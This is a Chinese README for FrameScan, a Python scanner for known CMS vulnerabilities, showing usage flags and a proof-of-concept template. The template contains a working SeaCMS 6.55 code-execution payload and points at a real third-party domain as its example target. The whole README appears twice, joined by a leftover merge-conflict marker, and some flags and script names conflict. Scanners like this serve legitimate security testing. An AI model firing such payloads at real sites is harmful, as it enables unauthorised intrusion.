# FrameScan

## 工具简介

FrameScan是一款python3编写的简易的cms漏洞检测框架，支持多种检测方式，支持大多数CMS，可以自定义CMS类型及自行编写POC。旨在帮助有安全经验的安全工程师对已知的应用快速发现漏洞。

## 支持平台

- Windows  

- Linux  

- MAC（请自测）

## 工具特点

- 单URL批量检测
- 单URL单漏洞检测
- 单URL指定CMS检测
- 多URL单漏洞检测
- 单URL单漏洞检测
- 单URL指定CMS检测

详细参数如下：

```
    -u          Url                      URL地址
    -f          Load urls file           文件路径
    -m          Use poc module           使用单个POC
    -c          Specify CMS              指定CMS类型
    -s          Search poc keywords      查找关键词漏洞
    -c          List CMS POC             列出指定CMS漏洞
    -l          List avalible pocs       列出所有POC
    -r          Reload POC               重新加载POC
    -h          Get help                 帮助信息
```


## 使用方法

下载项目

```python
git clone https://github.com/qianxiao996/FrameScan
```

安装依赖（不需要！）

```
脚本主要依赖于以下模块（无需安装）
import sys,os,re
from color import *
import sqlite3,requests
```

运行脚本

```
>python3 webcrack.py
     _____                         ____
    |  ___| __ __ _ _ __ ___   ___/ ___|  ___ __ _ _ __
    | |_ | '__/ _` | '_ ` _ \ / _ \___ \ / __/ _` | '_ \
    |  _|| | | (_| | | | | | |  __/___) | (_| (_| | | | |
    |_|  |_|  \__,_|_| |_| |_|\___|____/ \___\__,_|_| |_|

    Options:                          Code by qianxiao996
    -----------------------------------------------------
    -u          Url                      URL地址
    -f          Load urls file           文件路径
    -m          Use poc module           使用单个POC
    -c          Specify CMS              指定CMS类型
    -s          Search poc keywords      查找关键词漏洞
    -lc         List CMS POC             列出指定CMS漏洞
    -l          List avalible pocs       列出所有POC
    -r          Reload POC               重新加载POC
    -h          Get help                 帮助信息
    -----------------------------------------------------
    FrameScan  V1.0              Blog:blog.qianxiao996.cn
```

单URL批量检测

```
python3 FrameScan.py -u URL
```

单URL单漏洞检测（POC_METHOS可以用 -l、-s、-lc进行查询）

```
python3 FrameScan.py -u URL -m POC_METHOS
```

单URL指定CMS检测

```
python3 FrameScan.py -u URL -m POC_METHOS
```

多URL批量检测

```
python3 FrameScan.py -f 文件名
```

多URL单漏洞检测

```
python3 FrameScan.py -f 文件名  -m  POC_METHOS
```

多URL指定CMS检测

```
python3 FrameScan.py -f 文件名  -c  CMS类型
```

## 自定义POC模板

代码中采用自定义彩色输出，请尽量规范编写。脚本中为示例代码。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 漏洞名称（禁止换行）控制在30字以内
referer: 漏洞地址（禁止换行）未知请填unknown
author: 作者名
description: 漏洞描述 
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *
#方法名称自定义
class seacms_655_code_exec:
    def __init__(self, url):
        self.url = url
    def run(self):
        #此处编辑检测代码
        #示例代码，请尽量使用彩色字体 printGreen、 printBlue、printYellow函数
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*"
        url_path = self.url + "/search.php?phpinfo();"
        try:
            result = requests.get(url_path, timeout=3,headers=headers, verify=False)
            if result.status_code == 200 and 'code' in result.text:
                printGreen("[+]Success:存在seacms 6.55 代码执行漏洞！\nPayload:\nURL:%s\nPOST:%s"%(url_path,payload))
                sys.exit(1)
            else:
                printBlue("[-]Info:不存在seacms 6.55 代码执行漏洞")
                sys.exit(1)
        except Exception as e:
            # print (e)
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")
            sys.exit(1)

if __name__ == "__main__":
    #此处不会调用
    warnings.filterwarnings("ignore")
    testVuln = seacms_655_code_exec("http://baidu.com")
    testVuln.run()
```

## 鸣谢

POC多数来源于[<AngelSword>](https://github.com/Sch01ar/AngelSword)，部分为自己编写，欢迎投递POC

邮箱地址：qianxiao996@126.com

## 警告！

=======
# FrameScan

## 工具简介

FrameScan是一款python3编写的简易的cms漏洞检测框架，支持多种检测方式，支持大多数CMS，可以自定义CMS类型及自行编写POC。旨在帮助有安全经验的安全工程师对已知的应用快速发现漏洞。

## 支持平台

- Windows  

- Linux  

- MAC（请自测）

## 工具特点

- 单URL批量检测
- 单URL单漏洞检测
- 单URL指定CMS检测
- 多URL单漏洞检测
- 单URL单漏洞检测
- 单URL指定CMS检测

详细参数如下：

```
    -u          Url                      URL地址
    -f          Load urls file           文件路径
    -m          Use poc module           使用单个POC
    -c          Specify CMS              指定CMS类型
    -s          Search poc keywords      查找关键词漏洞
    -c          List CMS POC             列出指定CMS漏洞
    -l          List avalible pocs       列出所有POC
    -r          Reload POC               重新加载POC
    -h          Get help                 帮助信息
```


## 使用方法

下载项目

```python
git clone https://github.com/qianxiao996/FrameScan
```

安装依赖（不需要！）

```
脚本主要依赖于以下模块（无需安装）
import sys,os,re
from color import *
import sqlite3,requests
```

运行脚本

```
>python3 webcrack.py
     _____                         ____
    |  ___| __ __ _ _ __ ___   ___/ ___|  ___ __ _ _ __
    | |_ | '__/ _` | '_ ` _ \ / _ \___ \ / __/ _` | '_ \
    |  _|| | | (_| | | | | | |  __/___) | (_| (_| | | | |
    |_|  |_|  \__,_|_| |_| |_|\___|____/ \___\__,_|_| |_|

    Options:                          Code by qianxiao996
    -----------------------------------------------------
    -u          Url                      URL地址
    -f          Load urls file           文件路径
    -m          Use poc module           使用单个POC
    -c          Specify CMS              指定CMS类型
    -s          Search poc keywords      查找关键词漏洞
    -lc         List CMS POC             列出指定CMS漏洞
    -l          List avalible pocs       列出所有POC
    -r          Reload POC               重新加载POC
    -h          Get help                 帮助信息
    -----------------------------------------------------
    FrameScan  V1.0              Blog:blog.qianxiao996.cn
```

单URL批量检测

```
python3 FrameScan.py -u URL
```

单URL单漏洞检测（POC_METHOS可以用 -l、-s、-lc进行查询）

```
python3 FrameScan.py -u URL -m POC_METHOS
```

单URL指定CMS检测

```
python3 FrameScan.py -u URL -m POC_METHOS
```

多URL批量检测

```
python3 FrameScan.py -f 文件名
```

多URL单漏洞检测

```
python3 FrameScan.py -f 文件名  -m  POC_METHOS
```

多URL指定CMS检测

```
python3 FrameScan.py -f 文件名  -c  CMS类型
```

## 自定义POC模板

代码中采用自定义彩色输出，请尽量规范编写。脚本中为示例代码。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 漏洞名称（禁止换行）控制在30字以内
referer: 漏洞地址（禁止换行）未知请填unknown
author: 作者名
description: 漏洞描述 
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *
#方法名称自定义
class seacms_655_code_exec:
    def __init__(self, url):
        self.url = url
    def run(self):
        #此处编辑检测代码
        #示例代码，请尽量使用彩色字体 printGreen、 printBlue、printYellow函数
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*"
        url_path = self.url + "/search.php?phpinfo();"
        try:
            result = requests.get(url_path, timeout=3,headers=headers, verify=False)
            if result.status_code == 200 and 'code' in result.text:
                printGreen("[+]Success:存在seacms 6.55 代码执行漏洞！\nPayload:\nURL:%s\nPOST:%s"%(url_path,payload))
                sys.exit(1)
            else:
                printBlue("[-]Info:不存在seacms 6.55 代码执行漏洞")
                sys.exit(1)
        except Exception as e:
            # print (e)
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")
            sys.exit(1)

if __name__ == "__main__":
    #此处不会调用
    warnings.filterwarnings("ignore")
    testVuln = seacms_655_code_exec("http://baidu.com")
    testVuln.run()
```

## 鸣谢

POC多数来源于[<AngelSword>](https://github.com/Sch01ar/AngelSword)，部分为自己编写，欢迎投递POC

邮箱地址：qianxiao996@126.com

## 警告！

>>>>>>> 8a1c41c75905e6cb4bd801caa2f82a1b1cebf5a1
**请勿用于非法用途！否则自行承担一切后果**
